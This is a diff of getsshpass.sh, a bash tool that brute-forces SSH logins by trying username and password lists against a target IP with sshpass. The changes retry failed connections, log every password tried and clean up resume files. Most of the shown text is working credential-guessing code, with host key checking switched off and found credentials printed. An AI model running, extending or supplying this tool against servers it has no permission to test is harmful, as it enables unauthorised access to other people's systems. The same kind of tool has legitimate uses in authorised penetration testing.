@@ -1,4 +1,10 @@
 #!/bin/bash
+#
+# sshpass return values:
+#   0 - password OK
+#   3 - general runtime error
+#   5 - bad password
+#   255 - connection refused
 
 function usage { 
   echo -e "Usage: $0 [OPTIONS]"
@@ -15,7 +21,7 @@ function usage {
 
 function version
  {
-  echo -e "getsshpass.sh 0.6"
+  echo -e "getsshpass.sh 0.7"
   echo -e "Copyright (C) 2016 Radovan Brezula 'brezular'"
   echo -e "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>."
   echo -e "This is free software: you are free to change and redistribute it."
@@ -29,8 +35,10 @@ function read_args {
        a) ip="$OPTARG";;
        d) port="$OPTARG";;
        n) nval="$OPTARG";;
-       p) passlist="$OPTARG";;
-       u) userlist="$OPTARG";;
+       p) passlist="$OPTARG"
+          initpasslist="$passlist";;
+       u) userlist="$OPTARG"
+          inituserlist="$userlist";;
        v) version;;
        h) usage
           exit;;
@@ -126,8 +134,12 @@ function parallel_ssh {
  echo "$user":"$pass" > "$pthdir/01xza01.txt"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
  [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
- while [ "$retval" == 255 ]; do
+    #   While loop eliminates 'Connection refused' attempts -> retval=255 and 'General runtime error' -> retval=3  
+    #   It happens when parameter 'n' is too small
+    #   retval must be either 0 -> good password or 5 -> bad password
+ while [ "$retval" == 255 -o "$retval" == 3 ]; do
     sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
+    echo "Password: $pass Value: $retval" >> values.txt
     [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
     sleep "$nval"
  done
@@ -150,15 +162,15 @@ function launch_attack {
 }
 
 function evaluate_result {
-    sleep 2
     [ -f "$pthdir/01xza01.txt" ] && rm "$pthdir/01xza01.txt"                         # We don't need last saved password when script kills itself (password found) or
     if [ -f "$pthdir/x0x901f22result.txt" ]; then                                    # Display found username and password when password is found
        cat "$pthdir/x0x901f22result.txt"
     else 
        echo "*** Password not found, use other dictionary ***" 
     fi
-    pkill sshpass
-    exit 110
+    [ -f "$inituserlist".new ] && rm "$inituserlist".new                              # delete files $inituserlist.new and $initpasslist.new
+    [ -f "$initpasslist".new ] && rm "$initpasslist".new                              # they're created when interrupted guessing is used   
+    pkill sshpass  
 }
 
 
